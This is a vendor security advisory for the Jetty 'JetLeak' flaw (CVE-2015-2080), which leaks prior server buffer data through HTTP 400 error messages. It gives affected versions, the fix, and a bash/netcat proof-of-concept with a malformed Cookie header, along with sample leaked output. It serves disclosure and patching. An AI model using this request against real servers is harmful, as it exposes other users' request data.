HttpParser Error Buffer Bleed Vulnerability
===========================================

Published Date:
---------------

2015, Feb 24

CVE:
----

CVE-2015-2080

Discovered and Reported By:
---------------------------

[Gotham Digital Science](http://www.gdssecurity.com/) and Stephen Komal.

[JetLeak Vulnerability Remote Leakage of Shared Buffers in Jetty / blogs.gdsecurity.com](http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html)


Affected Versions of Jetty:
---------------------------

  * 9.2.3.v20140905
  * 9.2.4.v20141103
  * 9.2.5.v20141112
  * 9.2.6.v20141205
  * 9.2.7.v20150116
  * 9.2.8.v20150217
  * 9.3.0.M0
  * 9.3.0.M1

Versions of Jetty Containing Fix:
--------------------------------

  * 9.2.9.v20150224

Patched version of jetty-http.jar:
----------------------------------

Patched version of the affected jetty-http jars are available as attachments on https://bugs.eclipse.org/460642

Statement:
----------

Jetty versions 9.2.3.v20140905 through 9.2.8.v20150217 have a ByteBuffer reuse and information bleed vulnerability surrounding bad HTTP request header parsing error responses.

History:
--------

Back in Jetty 9.2.3, a feature requesting more detailed logging messages surrounding problems parsing bad HTTP request headers ( https://bugs.eclipse.org/443049 ) was implemented.

The feature request was to include better debug information in the Jetty logs (at WARN level) to help diagnose and resolve HTTP parsing errors.

However, the implementation incorrectly exposes this debug information back on the HTTP 400 response reason phrase, potentially exposing parts of server side buffers used from prior request processing on the same server.

The following bash shell script demonstrates the problem using netcat on linux against the Jetty Distribution's demo-base.

```
#!/bin/bash

RESOURCEPATH="/test/dump/info"
BAD=$'\a'

function normalRequest {
echo "-- Normal Request --"

nc localhost 8080 << NORMREQ
POST $RESOURCEPATH HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Connection: close
Content-Length: 16

Username=Joakim
NORMREQ
}

function badCookie {
echo "-- Bad Cookie --"

nc localhost 8080 << BADCOOKIE
GET $RESOURCEPATH HTTP/1.1
Host: localhost
Coo${BAD}kie: ${BAD}

BADCOOKIE
}

normalRequest
echo ""
echo ""
badCookie
```

The results are often seen in the HTTP response such as ...

```
HTTP/1.1 400 Illegal character 0x7 in state=HEADER_IN_NAME in 'GET /dummy/ HTTP/... localhost\nCoo\x07<<<kie: \x07\n\n>>>e: application/x-...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
Content-Length: 0
Connection: close
Server: Jetty(9.2.8.v20150217)
```

What you are seeing is a http response phrase that includes raw ByteBuffer details on what happened during the parsing failure.

The parts of the output are in the general form
`{what_has_been_parsed}<<<{left_to_parse}>>>{old_buffer_seen_past_limit}`

The part at `{old_buffer_seen_past_limit}` is where this exposure of past buffers comes from.  It is this information where an exploit could be made to present random prior buffers from the server buffer pool.  This information can contain anything seen in a past handled request.

We have this problem already patched in Jetty 9.2.9.v20150224, and the same test as above results in ...

```
HTTP/1.1 400 Illegal character 0x7
Content-Length: 0
Connection: close
Server: Jetty(9.2.9.v20150224)
```

Everyone is strongly encouraged to upgrade to Jetty 9.2.9.v20150224 immediately.



